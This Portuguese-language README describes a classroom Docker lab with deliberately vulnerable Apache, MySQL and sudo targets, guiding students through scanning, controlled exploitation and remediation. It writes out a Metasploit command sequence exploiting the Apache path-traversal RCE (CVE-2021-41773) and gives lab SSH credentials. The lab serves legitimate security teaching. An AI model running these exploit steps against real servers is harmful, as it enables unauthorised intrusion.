# Laboratório Docker — análise, exploração e correção de vulnerabilidades

Laboratório didático para a disciplina de Segurança de Redes de Computadores.
Os três alvos são deliberadamente antigos e vulneráveis. O objetivo é fazer o
ciclo completo: descobrir, confirmar, documentar o impacto e corrigir.

Este laboratório está em Aula 06 - Avaliação 2/lab-docker-vulnerabilidades.
Os comandos abaixo podem ser executados a partir da pasta do laboratório ou
pelos scripts, que resolvem automaticamente a própria localização.

Ao iniciar o laboratório, os três alvos e o serviço do Metasploit sobem juntos.
O Nmap e o verificador do MySQL permanecem disponíveis para execução sob
demanda.

Para seguir somente as tarefas da avaliação, use o [roteiro do aluno](roteiro.md).

> **Uso restrito ao laboratório.** Os serviços ficam publicados somente em
> `127.0.0.1` e os containers se comunicam pela rede privada do Compose. Não
> altere os endereços para expor os alvos à rede da instituição ou à Internet.

## Objetivos de aprendizagem

- diferenciar descoberta de serviço, identificação de versão e confirmação de
  vulnerabilidade;
- relacionar versão, configuração, CVE, impacto e correção;
- utilizar uma ferramenta de varredura e uma ferramenta de exploração em um
  ambiente autorizado;
- registrar evidências antes e depois da correção;
- compreender por que uma vulnerabilidade de kernel não deve ser simulada
  diretamente em um container que compartilha o kernel do host.

## Topologia

| Alvo | Serviço | Porta no host | Porta dentro da rede Docker | Acesso inicial |
| --- | --- | ---: | ---: | --- |
| `apache` | servidor web | `8081` | `80/tcp` | HTTP |
| `mysql` | banco de dados | `13306` | `3306/tcp` | protocolo MySQL |
| `osroot` | Linux com SSH | `2222` | `22/tcp` | usuário `aluno`, senha `aluno` |

Os nomes `apache`, `mysql` e `osroot` resolvem dentro da rede `labnet`. O
Metasploit é iniciado junto com os alvos; o scanner Nmap e o verificador do
MySQL são ferramentas auxiliares executadas sob demanda e não contam como
alvos do exercício.

### Topologia completa, incluindo as ferramentas

```text
                  dsc-lab-vulnerabilidades_labnet
  ┌──────────────────────────────────────────────────────┐
  │                                                      │
  │   apache:80          mysql:3306          osroot:22   │
  │      ▲                  ▲                   ▲        │
  │      │                  │                   │        │
  │  exploiter          mysql-check        scanner       │
  │ (Metasploit)       (cliente MySQL)   (Nmap: os três) │
  │                                                      │
  └──────────────────────────────────────────────────────┘

  Portas publicadas somente no computador do aluno:
  127.0.0.1:8081 ──► apache:80
  127.0.0.1:13306 ──► mysql:3306
  127.0.0.1:2222 ──► osroot:22
```

O **Metasploit** está definido no serviço Compose chamado `exploiter`. Ele não
publica uma porta própria: é iniciado automaticamente com o laboratório, fica
conectado à mesma rede dos alvos e acessa o Apache usando `apache:80`. Para
abrir uma console interativa no serviço já iniciado:

```powershell
docker compose exec exploiter msfconsole -q
```

O comando normal `docker compose up -d` inicia os três alvos e o Metasploit. O
perfil `tools` continua reservado ao Nmap e ao verificador do MySQL. Dentro do
container do Metasploit, não use `127.0.0.1:8081`; use o nome do serviço e a
porta interna, por exemplo `RHOSTS apache` e `RPORT 80`.

## Requisitos

- Docker Desktop com Docker Compose V2;
- pelo menos 4 GB de memória disponíveis para o Docker;
- pelo menos 4 GB livres em disco para as imagens-base; reserve mais espaço se
  também armazenar as ferramentas no registry local;
- PowerShell 5.1 ou PowerShell 7;
- conexão à Internet apenas durante o primeiro download das imagens.

## Registry local opcional

O registry local é um serviço separado do laboratório vulnerável. Ele armazena
as imagens em um volume Docker persistente e, por padrão, publica somente em
127.0.0.1:5000. Assim, pode ser usado no mesmo computador sem criar uma nova
superfície de acesso para os alvos.

Arquivos relacionados:

- registry/compose.yaml: inicia o registry e o volume de armazenamento;
- scripts/registry-start.ps1: inicia o registry;
- scripts/registry-stop.ps1: para o registry sem remover as imagens;
- scripts/publish-local-registry.ps1: cria as tags e publica as imagens;
- compose.registry.yaml: executa o laboratório usando as imagens publicadas.

Fluxo para preparar o registry no mesmo computador:

~~~powershell
Set-Location C:\projetos\DisciplinaSegurancaRedeComputadores\Aula 06 - Avaliação 2\lab-docker-vulnerabilidades

.\scripts\start.ps1
.\scripts\registry-start.ps1
.\scripts\publish-local-registry.ps1
.\scripts\stop.ps1
docker compose -f .\compose.registry.yaml up -d
~~~

O script de publicação envia Apache, MySQL, Linux/Sudo, a imagem do scanner e
o Metasploit, pois ele faz parte da inicialização padrão do laboratório. Para
espelhar também o Trivy, faça o download explícito e use a opção adicional:

~~~powershell
docker pull aquasec/trivy:0.74.0
.\scripts\publish-local-registry.ps1 -IncludeOptionalTools
~~~

Depois, o Compose alternativo pode ser usado com:

~~~powershell
docker compose -f .\compose.registry.yaml up -d
docker compose -f .\compose.registry.yaml exec exploiter msfconsole -q
~~~

Para outro computador da rede, localhost não aponta para o computador do
professor. Configure o registry com TLS, autenticação e firewall apropriado e
defina, no computador do aluno, o endereço do professor:

~~~powershell
$env:LAB_REGISTRY = '192.168.0.10:5000'
docker compose -f .\compose.registry.yaml up -d
~~~

Não exponha um registry HTTP sem autenticação na rede da instituição. O
registry não precisa acessar o socket do Docker; ele somente armazena camadas.

## Iniciar o laboratório

No PowerShell:

~~~powershell
Set-Location C:\projetos\DisciplinaSegurancaRedeComputadores\Aula 06 - Avaliação 2\lab-docker-vulnerabilidades
.\scripts\start.ps1
~~~

Para parar sem apagar volumes ou imagens:

```powershell
docker compose down
```

## Etapa 1 — descoberta e varredura

O script apresenta as versões, confirma o comportamento do MySQL e exibe ao
final uma seção com os identificadores CVE associados ao cenário. Use esses
identificadores como ponto de partida para a pesquisa; o roteiro não entrega a
explicação, o impacto ou a correção pronta.

```powershell
.\scripts\scan.ps1
```

O script usa:

- **Nmap** para descoberta e identificação de versão; o Compose também fornece
  um verificador controlado baseado no cliente MySQL para confirmar o alvo
  antigo sem depender de diferenças entre versões da NSE;
- uma lista de CVEs para pesquisa, relacionada aos componentes vulneráveis do
  laboratório;
- **Trivy**, opcionalmente, para a análise de pacotes das imagens locais.

Também é possível executar os comandos manualmente:

```powershell
docker compose --profile tools run --rm scanner -Pn -sV -p 80 apache
docker compose --profile tools run --rm scanner -Pn -sV -p 3306 mysql
docker compose --profile tools run --rm mysql-check
docker compose --profile tools run --rm scanner -Pn -sV -p 22 osroot
```

Para analisar as imagens com Trivy, depois de construir o laboratório:

```powershell
docker run --rm -v /var/run/docker.sock:/var/run/docker.sock aquasec/trivy:0.74.0 image --severity HIGH,CRITICAL dsc-lab/apache-vulneravel:2.4.49
docker run --rm -v /var/run/docker.sock:/var/run/docker.sock aquasec/trivy:0.74.0 image --severity HIGH,CRITICAL dsc-lab/osroot-vulneravel:sudo-1.8.21
```

O resultado do scanner e a lista de CVEs são indicações iniciais. Compare as
versões e os identificadores com fontes confiáveis antes de afirmar que uma
exploração foi confirmada.

Se o Trivy tiver sido espelhado no registry local, substitua a imagem do
comando por localhost:5000/dsc/trivy:0.74.0.

~~~powershell
docker run --rm -v /var/run/docker.sock:/var/run/docker.sock localhost:5000/dsc/trivy:0.74.0 image --severity HIGH,CRITICAL dsc-lab/apache-vulneravel:2.4.49
~~~

## Etapa 2 — investigação e exploração controlada

Cada grupo deve produzir uma ficha para cada alvo contendo:

1. serviço, versão e porta;
2. vulnerabilidade pesquisada e referência da fonte;
3. pré-condições para exploração;
4. evidência mínima do impacto;
5. risco para confidencialidade, integridade e disponibilidade;
6. correção recomendada;
7. evidência de que a correção funcionou.

### Alvo web

Use o serviço do Metasploit, iniciado junto com o laboratório, para pesquisar e
testar o módulo relacionado ao Apache. Abra uma console interativa no serviço:

```powershell
docker compose exec exploiter msfconsole -q
```

Dentro do Metasploit:

```text
use exploit/multi/http/apache_normalize_path_rce
set CVE CVE-2021-41773
set RHOSTS apache
set RPORT 80
set SSL false
set TARGETURI /cgi-bin
set TARGET 1
set PAYLOAD cmd/unix/generic
set CMD id
set AllowNoCleanup true
check
run
exit
```

A prova deve ser limitada a uma informação inofensiva, como a identidade do
processo (`id`) ou a leitura controlada de um arquivo de teste. Não use payload
persistente, reverse shell ou conexão externa.

### Alvo de banco de dados

O Compose fornece um verificador controlado para a falha de autenticação do
MySQL. Ele deve ser executado somente contra o serviço `mysql` deste Compose.
O objetivo da aula é demonstrar o acesso indevido e consultar apenas dados
fictícios do laboratório, sem alteração de tabelas. Como atividade de pesquisa,
os alunos podem comparar o resultado com o script NSE correspondente do Nmap.

### Alvo de sistema operacional

Conecte-se por SSH ao container e faça a enumeração local:

```powershell
ssh -p 2222 aluno@127.0.0.1
```

Depois de identificar a versão do componente de privilégio, demonstre a
elevação somente dentro do container e registre `id` como evidência. O acesso
root obtido no exercício é root do container, não do computador hospedeiro.

## Etapa 3 — correção

Os alunos devem modificar o material e repetir a varredura. A correção precisa
ser demonstrada, não apenas descrita:

- atualizar o servidor web para uma versão corrigida e remover a configuração
  permissiva que expõe CGI e caminhos fora do document root;
- atualizar o MySQL para uma versão corrigida, restringir administração remota
  e usar autenticação e privilégios mínimos;
- atualizar o pacote de privilégio do Linux e substituir a regra ampla de
  `sudo` por uma política de menor privilégio;
- reconstruir as imagens sem cache quando necessário;
- confirmar que a exploração deixa de funcionar e que o serviço continua
  atendendo apenas o que é necessário.

Uma forma de comparar antes e depois é salvar a saída dos scanners:

```powershell
New-Item -ItemType Directory -Force .\resultado | Out-Null
docker compose --profile tools run --rm scanner -Pn -sV -p 80 apache | Tee-Object .\resultado\apache-depois.txt
```

## Entrega sugerida

- relatório curto por alvo;
- saída do scanner antes da correção;
- evidência da exploração controlada;
- alteração realizada no Dockerfile, configuração ou Compose;
- saída do scanner depois da correção;
- explicação de uma limitação ou falso positivo encontrado.

## Limpeza

Ao terminar a aula:

```powershell
docker compose down
```

Para remover também os volumes criados pelo laboratório, execute `docker
compose down -v` somente depois de confirmar que não há outro serviço usando o
projeto.

Se o registry local estiver ativo, pare-o separadamente:

~~~powershell
.\scripts\registry-stop.ps1
~~~

Esse comando preserva o volume dsc-lab-registry-data. Para apagar também o
armazenamento das imagens do registry, use docker compose -f
./registry/compose.yaml down -v somente quando essa remoção for intencional.
